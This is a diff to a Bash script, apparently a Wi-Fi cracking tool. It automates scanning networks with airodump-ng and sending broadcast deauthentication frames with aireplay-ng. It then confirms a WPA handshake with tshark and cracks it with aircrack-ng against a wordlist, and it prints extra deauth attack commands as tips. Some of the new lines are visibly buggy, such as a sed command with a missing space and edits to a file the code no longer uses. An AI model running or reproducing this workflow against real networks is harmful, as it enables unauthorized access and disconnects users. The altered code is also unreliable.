@@ -125,54 +125,38 @@ function select_target_network() {
 	kill -9 $airodump_xterm_pid
 	wait $airodump_xterm_pid &>/dev/null
 
+	cat ${airodump_file}-01.csv | grep -Ev ", OPN, " >airodump-dump-filtered-open.csv
+	# Eliminamos las primera linea del archivo
 	sed -i '1,2d' ${airodump_file}-01.csv
-	sed -i '1,/Station MAC/!d' ${airodump_file}-01.csv
-	sed -i '1,/Station MAC/d' ${airodump_file}-01.csv
+	# Eliminamos las lineas donde se encuentran los clientes, para dejar solo las redes
+	sed -i '/Station MAC/,$d'${airodump_file}-01.csv
+	# Atajamos posibles typos que puedan haber
+	sed -i 's/2,4/2.4/g' ${airodump_file}-01.csv
+	sed -i 's/5,8/5.8/g' ${airodump_file}-01.csv
 
-	networks="|······BSSID······|········ESSID·······|CHANNEL|POWER|SECURITY|,"
-	while IFS=, read -r bssid first_time last_time channel speed privacy cipher authentication power beacons iv lan_ip id_length essid key; do
-		if [[ $privacy != " OPN" ]]; then
-			dots="····················"
-			essid=$(echo $essid | sed 's/\"//g' | sed 's/,//g' | sed 's/ //g')
-			essid="${essid}${dots}"
-			channel="$(echo $channel | sed 's/ //g')"
-			channel="${channel}${dots}"
-			power="$((power + 100))"
-			power="${power} %${dots}"
-			privacy="$(echo $privacy | sed 's/ //g')"
-			privacy="${privacy}${dots}"
-			networks="${networks}|${bssid}|${essid::20}|${channel::7}|${power::5}|${privacy::8}|,"
-		fi
-	done <${airodump_file}-01.csv
+	network_list=()
+	while IFS= read -r line; do
+		network_list+=("$line")
+	done < <(cut -d ',' -f14,4,6,8,1 airodump-dump-filtered-open.csv)
 
-	echo $networks >${airodump_file}-01.parsed
+	target_network=$(gum choose "${network_list[@]}")
 
-	echo -e "\n${good}[+]${nc} Scanned networks"
-	PS3="[?] Select the target network: "
-	IFS=,
-	select target_network in $(cat ${airodump_file}-01.parsed); do
-		if [[ $target_network == "" ]]; then
-			echo -e "${wrong}[-]${nc} Invalid option"
-		else
-			break
-		fi
-	done
-	unset IFS
-	ap_bssid=$(echo $target_network | cut -d'|' -f2 | sed 's/·//g')
-	ap_channel=$(echo $target_network | cut -d'|' -f4 | sed 's/ //g' | sed 's/·//g')
-	ap_essid=$(echo $target_network | cut -d'|' -f3)
-	echo -e "\n${good}[+]${nc} You choose ${yellow}${ap_bssid}${nc} on channel ${yellow}${ap_channel}${nc} with the name ${yellow}${ap_essid}${nc}"
+	ssid="${target_network##*, }"
+	bssid="${target_network%%,*}"
+	channel="$(echo "$target_network" | awk -F', ' '{print $2}')"
+
+	echo -e "\n${good}[+]${nc} You choose ${yellow}${bssid}${nc} on channel ${yellow}${channel}${nc} with the name ${yellow}${ssid}${nc}"
 	rm -rf airodump*
 }
 
 function handshake() {
-	echo -e "\n${doing}[~]${nc} Listening network traffic of ${ap_bssid} on channel ${ap_channel}"
+	echo -e "\n${doing}[~]${nc} Listening network traffic of ${bssid} on channel ${channel}"
 	user_sleep
 	echo -e "\n${yellow}[*]${nc} A new terminal will be opened to show you the traffic of the network"
 	user_sleep
 	do_not_close_sign
 	user_sleep
-	xterm -hold -e "airodump-ng -c $ap_channel -w "capture_${ap_bssid}" --bssid "${ap_bssid}" ${network_card}" &
+	xterm -hold -e "airodump-ng -c $channel -w "capture_${bssid}" --bssid "${bssid}" ${network_card}" &
 	airodump_filter_xterm_pid=$!
 
 	echo -e "\n${yellow}[*]${nc} A new terminal will be opened to send the deauth packets"
@@ -181,7 +165,7 @@ function handshake() {
 	user_sleep
 	echo -e "\n${doing}[~]${nc} Deauthenticating all clients..."
 	user_sleep
-	xterm -hold -e "aireplay-ng -0 5 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}" &
+	xterm -hold -e "aireplay-ng -0 5 -a ${bssid} -c ff:ff:ff:ff:ff:ff ${network_card}" &
 	aireplay_xterm_pid=$!
 
 	sleep 10 # Waiting deauthentication
@@ -194,7 +178,7 @@ function handshake() {
 
 	sleep ${handshake_wait}
 
-	tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1>handshake.txt 2>/dev/null
+	tshark -r capture_${bssid}-01.cap -Y "eapol" 1>handshake.txt 2>/dev/null
 
 	if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
 		echo -e "\n${good}[+]${nc} Handshake captured"
@@ -204,10 +188,10 @@ function handshake() {
 		echo -e "\n${wrong}[-]${nc} Handshake could not be captured"
 		echo -e "\n${yellow}[*]${nc} You could wait until the handshake is captured or press ${ask}enter${nc} to continue"
 		echo -e "\n${info}[·]${nc} TIP: You can try to see the clients and send the deauth packets to them using aireplay in another terminal: "
-		echo -e "${cmd}sudo aireplay-ng -0 5 -a ${ap_bssid} -c client_mac_address ${network_card}"
-		echo -e "${cmd}sudo aireplay-ng -0 5 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"
+		echo -e "${cmd}sudo aireplay-ng -0 5 -a ${bssid} -c client_mac_address ${network_card}"
+		echo -e "${cmd}sudo aireplay-ng -0 5 -a ${bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"
 		wait_for_confirmation
-		tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1>handshake.txt 2>/dev/null
+		tshark -r capture_${bssid}-01.cap -Y "eapol" 1>handshake.txt 2>/dev/null
 		if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
 			echo -e "\n${good}[+]${nc} Handshake captured"
 			kill -9 $airodump_filter_xterm_pid
@@ -229,12 +213,12 @@ function handshake() {
 			fi
 		fi
 	fi
-	tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1>handshake.txt 2>/dev/null
+	tshark -r capture_${bssid}-01.cap -Y "eapol" 1>handshake.txt 2>/dev/null
 	if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
 		mkdir -p handshakes
 		mv capture_* handshakes/
 
-		xterm -hold -e "aircrack-ng -w $wordlist_path handshakes/capture_${ap_bssid}-01.cap" &
+		xterm -hold -e "aircrack-ng -w $wordlist_path handshakes/capture_${bssid}-01.cap" &
 		aircrack_xterm_pid=$!
 		echo -e "\n${yellow}[*]${nc} Cracking handshake..."
 		echo -e "\n${yellow}[!]${nc} Remember to kill the process when you have the password"
